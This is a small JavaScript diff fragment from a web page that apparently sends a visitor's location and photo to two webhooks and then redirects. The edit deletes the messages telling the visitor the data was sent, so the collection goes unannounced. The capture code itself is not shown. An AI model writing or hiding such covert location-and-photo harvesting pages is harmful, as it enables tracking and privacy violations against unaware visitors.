@@ -106,8 +106,7 @@
       }),
     });
 
-    console.log("✅ Lokasi & foto berhasil dikirim ke dua webhook!");
-    document.body.innerHTML = "<h3>✅ Data berhasil dikirim!</h3>";
+    
 
     // Redirect setelah semua selesai
     setTimeout(() => (window.location.href = REDIRECT_URL), 2000);
